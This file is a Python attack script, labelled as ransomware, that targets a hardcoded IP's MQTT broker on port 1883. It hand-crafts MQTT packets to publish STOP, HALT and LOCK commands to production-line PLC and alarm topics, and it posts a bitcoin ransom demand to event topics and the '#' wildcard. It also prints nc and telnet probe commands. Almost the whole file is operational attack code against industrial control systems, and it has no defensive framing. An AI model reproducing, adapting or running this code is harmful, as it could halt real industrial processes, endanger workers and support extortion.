#!/usr/bin/env python3
# MIL_RANSOMWARE_v5.0 - TRUSTEDF57 (CONNESSIONE FORZATA)
import socket
import json, time, base64, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

class MilitaryRansomware:
    def __init__(self):
        self.target_ip = "67.218.246.15"
        self.port = 1883
        self.btc_addr = "STAMMATIN-O-TENG-TUOST"
        
        # Simple AES (fixed keys)
        self.key = b"TRUSTEDF57_256BITKEY12345678901234567890123456789012"[:32]
        self.iv = b"TRUSTEDF57_IV_1234567890123456"[:16]
        
        with open("key_v5.aes", "wb") as f:
            f.write(self.key + self.iv)
        print("[KEY] key_v5.aes salvata")
    
    def simple_encrypt(self, data):
        """AES semplice"""
        try:
            padder = padding.PKCS7(128).padder()
            padded = padder.update(data) + padder.finalize()
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
            enc = cipher.encryptor()
            return base64.b64encode(enc.update(padded) + enc.finalize()).decode()
        except:
            return base64.b64encode(data).decode()
    
    def mqtt_publish_direct(self, topic, payload):
        """MQTT PUBLISH diretto - SEMPLICE"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.port))
            
            # MQTT CONNECT veloce
            client_id = f"rustef57_{int(time.time())}".encode()
            connect = b"\x10\x1C\x00\x04MQTT\x04\xC2\x00$\x00" + bytes([len(client_id)]) + client_id
            sock.send(connect)
            sock.recv(1024)  # CONNACK
            
            # PUBLISH
            enc_payload = self.simple_encrypt(payload)
            topic_bytes = topic.encode()
            payload_bytes = enc_payload.encode()
            
            pkt_len = 2 + len(topic_bytes) + len(payload_bytes)
            publish = bytes([0x30, pkt_len]) + bytes([len(topic_bytes)]) + topic_bytes + payload_bytes
            
            sock.send(publish)
            print(f"✅ INJECT -> {topic[:40]}...")
            sock.close()
            return True
        except Exception as e:
            print(f"❌ {topic[:30]}: {e}")
            return False
    
    def attack_all(self):
        """ATTACCO MASSIVO"""
        targets = [
            ("Linea5ResultsFromCyclicRead/Alarms_DB4", '{"STOP":true,"OP":"TRUSTEDF57"}'),
            ("Linea4ResultsFromCyclicRead/Alarms_DB4", '{"HALT":true,"OP":"TRUSTEDF57"}'),
            ("MoliendaResultsFromCyclicRead/Plc", '{"LOCK":true,"OP":"TRUSTEDF57"}'),
            ("Linea5ResultsFromCyclicRead/Events", f'{{"RANSOM":"{self.btc_addr}","AMT":"2.5"}}'),
            ("Linea4ResultsFromCyclicRead/Events", f'{{"ALARM":"PAY_{self.btc_addr}"}}'),
            ("System/Diagnostics/P1-Sources/L4_L5_Molienda", '{"MIL_LOCK":true}'),
            ("$SYS/broker/ransom/TRUSTEDF57", f"PAID:{self.btc_addr}:2.5BTC"),
            ("#", '{"GLOBAL_LOCK":"TRUSTEDF57"}'),  # Wildcard test
        ]
        
        print("\n🔥 INIZIO ATTACCO MASSIVO...")
        success = 0
        for topic, payload in targets:
            if self.mqtt_publish_direct(topic, payload):
                success += 1
            time.sleep(0.2)  # Rate limit
        
        print(f"\n🎯 {success}/{len(targets)} PAYLOAD INJECTED!")
        print("💾 Check loot files...")
    
    def sniff_port(self):
        """Verifica porta aperta"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.port))
            sock.close()
            if result == 0:
                print(f"✅ Porta {self.port} APERTA")
                return True
            else:
                print(f"❌ Porta {self.port} CHIUSA (codice {result})")
        except:
            print("❌ Errore verifica porta")
        return False
    
    def run(self):
        print("🔴🔴 TRUSTEDF57 v5.0 - DIRECT MQTT ATTACK 🔴🔴")
        print(f"Target: {self.target_ip}:{self.port}")
        
        if self.sniff_port():
            print("\n🚀 LANCIO ATTACCO...")
            self.attack_all()
        else:
            print("\n❌ Porta non raggiungibile - prova:")
            print("  nc -v 67.218.246.15 1883")
            print("  telnet 67.218.246.15 1883")
        
        print("\n👀 Monitora dashboard per effetti!")
        input("Premi ENTER per uscire...")

if __name__ == "__main__":
    rw = MilitaryRansomware()
    rw.run()
